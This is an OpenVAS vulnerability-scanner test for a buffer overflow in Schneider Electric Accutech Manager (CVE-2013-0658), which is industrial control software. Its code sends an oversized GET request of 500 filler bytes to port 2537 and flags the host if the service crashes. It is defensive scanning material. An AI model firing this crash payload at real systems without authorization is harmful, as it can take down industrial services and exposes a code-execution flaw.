###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_se_accutech_manager_bof_vuln.nasl 6115 2017-05-12 09:03:25Z teissa $
#
# Schneider Electric Accutech Manager Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803170");
  script_version("$Revision: 6115 $");
  script_bugtraq_id(57651);
  script_cve_id("CVE-2013-0658");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-05-12 11:03:25 +0200 (Fri, 12 May 2017) $");
  script_tag(name:"creation_date", value:"2013-02-11 19:51:40 +0530 (Mon, 11 Feb 2013)");
  script_name("Schneider Electric Accutech Manager Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/52034");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24474");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/52034");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports(2537);
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary code or cause the application to crash, creating a denial-of-service condition.

  Impact Level: System/Application");
  script_tag(name:"affected", value:"Schneider Electric Accutech Manager version 2.00.1 and prior.");
  script_tag(name:"insight", value:"The flaw is caused by an unspecified error, which can be exploited
  to cause a heap-based buffer overflow by sending a specially crafted GET
  request with more than 260 bytes to TCP port 2537.");
  script_tag(name:"solution", value:"Upgrade to Schneider Electric Accutech Manager 2.00.4 or later.
  For updates refer to http://www.schneider-electric.com/site/home/index.cfm/ww/");
  script_tag(name:"summary", value:"The host is running Schneider Electric Accutech Manager and is
  prone to buffer overflow vulnerability.");

  exit(0);
}


include("http_func.inc");

## Variable Initialization
req = "";
res = "";
banner = "";
port = 2537;

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
## Application specific response is not available
banner = get_http_banner(port: port);
if(!banner){
  exit(0);
}

## Construct attack request
req = http_get(item:string("/",crap(500)), port:port);

## Send crafted request
res = http_send_recv(port:port, data:req);
sleep(1);

## Confirm Schneider Electric Accutech Manager Server is dead
if(http_is_dead(port:port)){
  security_message(port:port);
  exit(0);
}

exit(99);